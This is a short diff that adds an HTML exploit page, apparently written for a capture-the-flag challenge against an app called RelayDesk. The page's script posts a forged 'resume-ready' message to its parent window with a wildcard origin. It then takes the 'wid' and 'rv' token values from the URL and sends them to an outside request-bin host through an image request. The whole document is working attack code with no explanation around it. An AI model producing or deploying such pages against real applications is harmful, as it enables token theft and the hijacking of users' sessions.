@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>x</title></head>
+<body>
+<script>
+// RelayDesk exploit - send resume-ready postMessage to renderer parent
+try { window.parent.postMessage({type: 'relaydesk:resume-ready'}, '*'); } catch(e) {}
+
+// Also log visit with tokens to requestbin
+var params = new URLSearchParams(window.location.search);
+var wid = params.get('wid');
+var rv = params.get('rv');
+if (wid || rv) {
+    new Image().src = 'https://sfpaguc.request.dreamhack.games/token?wid=' + encodeURIComponent(wid||'') + '&rv=' + encodeURIComponent(rv||'');
+}
+</script>
+</body>
+</html>
